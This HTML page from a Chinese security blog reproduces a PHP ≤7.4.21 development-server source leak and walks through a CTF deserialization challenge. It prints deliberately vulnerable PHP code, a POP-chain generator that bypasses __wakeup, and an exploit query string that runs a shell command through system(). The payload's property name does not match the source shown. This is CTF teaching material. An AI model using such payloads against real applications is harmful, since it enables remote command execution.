@@ -1,0 +1,264 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PHP Development Server源码泄露 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PHP Development Server源码泄露 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="漏洞复现
+版本：PHP &lt;= 7.4.21
+准备环境：
+docker pull php:7.4.21
+docker run --rm -i -t -p 2333:80 php:7.4.21 /bin/bash
+echo &quot;&..." />
+    <meta name="keywords" content="漏洞复现,反序列化,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PHP Development Server源码泄露
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-06-08
+              </span>
+              <span>
+                2 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/fKwN_Yn3T/" class="post-tag">
+                  # 漏洞复现
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/VdmrICFMJ/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/php-development-server-yuan-ma-xie-lu.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="漏洞复现">漏洞复现</h1>
+<p>版本：PHP &lt;= 7.4.21</p>
+<p>准备环境：</p>
+<pre><code>docker pull php:7.4.21
+docker run --rm -i -t -p 2333:80 php:7.4.21 /bin/bash
+echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; phpinfo.php 
+php -S 0.0.0.0:80
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1686195111541.png" alt="" loading="lazy"></figure>
+<p>关掉Burp自动修改Content-Length的功能<br>
+<img src="https://skyblu3519.github.io/post-images/1686194967161.png" alt="" loading="lazy"></p>
+<p>源码泄露<br>
+<img src="https://skyblu3519.github.io/post-images/1686195149951.png" alt="" loading="lazy"></p>
+<h1 id="2023饶派杯xctf车联网挑战赛fileread">[2023饶派杯XCTF车联网挑战赛]fileread</h1>
+<p>感谢大锅们复现的题目🙏</p>
+<p>这里最难的部分就是获取这个源码：<br>
+<img src="https://skyblu3519.github.io/post-images/1686195828271.png" alt="" loading="lazy"></p>
+<p>然后就是简单的反序列化：</p>
+<pre><code class="language-php">&lt;?php
+show_source(&quot;index.php&quot;);
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp;amp; ~E_NOTICE&quot;);
+class A
+{
+    public $func;
+    public $end2;
+    public function __wakeup()
+    {
+        $this-&gt;end2=&quot;die&quot;;
+    }
+    public function __call($method, $args)
+    {
+        echo &quot;begin&quot;;
+    }
+    public function __destruct()
+    {
+        $this-&gt;func=&quot;system&quot;;
+        $waf=$this-&gt;end2;
+        $func=$this-&gt;func;
+        $waf();
+        $func($_GET[&quot;param&quot;]);
+    }
+}
+class B
+{
+    public $poc;
+    public function __destruct()
+    {
+        $this-&gt;poc-&gt;test();
+    }
+}
+echo unserialize($_GET[&quot;poc&quot;]);
+</code></pre>
+<p>这里需要绕过<code>__wakeup</code>，进而在<code>__destruct</code>避免<code>$waf()</code>执行<code>die()</code>，然后通过<code>param</code>传参执行<code>system</code>。</p>
+<p>由于PHP版本，CVE-2016-7124的方法无法使用。正确的解法是建立一个<code>$end2</code>到<code>$func</code>的引用，这样在<code>__wakeup</code>中执行<code>$this-&gt;end2=&quot;die&quot;</code>还可以在<code>__destruct</code>中通过<code>$this-&gt;func=&quot;system&quot;</code>修改<code>$this-&gt;end2</code>。</p>
+<p>pop链构造：</p>
+<pre><code class="language-php">&lt;?php
+class A
+{
+    public $func;
+    public $end2;
+
+}
+
+$a = new A();
+$a-&gt;func = &amp;$a-&gt;end2;
+echo serialize($a);
+</code></pre>
+<p>exp: <code>poc=O:1:&quot;A&quot;:2:{s:4:&quot;func&quot;;N;s:15:&quot;end_ifadajdqdqd&quot;;R:2;}&amp;param=cat /ffffllaggggggg</code></p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://cloud.tencent.com/developer/article/2235691">PHP&lt;=7.4.21 Development Server源码泄露漏洞</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li>
+<li><a href="#2023%E9%A5%B6%E6%B4%BE%E6%9D%AFxctf%E8%BD%A6%E8%81%94%E7%BD%91%E6%8C%91%E6%88%98%E8%B5%9Bfileread">[2023饶派杯XCTF车联网挑战赛]fileread</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/sql-wu-lie-ming-zhu-ru/">
+              <h3 class="post-title">
+                SQL无列名注入
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
